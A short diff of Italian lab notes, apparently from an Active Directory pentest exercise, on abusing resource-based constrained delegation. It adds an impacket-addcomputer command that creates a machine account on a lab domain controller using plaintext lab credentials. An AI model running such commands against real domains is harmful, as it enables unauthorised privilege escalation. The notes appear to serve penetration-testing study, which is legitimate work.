@@ -38,5 +38,8 @@ Puoi loggare dopo con wmixec
 Può essere abusato modificando msDS-AllowedToActOnBehalfOfOtherIdentity.
 Per esempio può essere effettuato quando hai genericAll o genericWrite ACl su un computer
 ![[Pasted image 20230911114240.png]]
+Creiamo un computer X
+```bash
+impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'
+```
 
-addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'sevenkingdoms.local/stannis.baratheon:Drag0nst0ne'
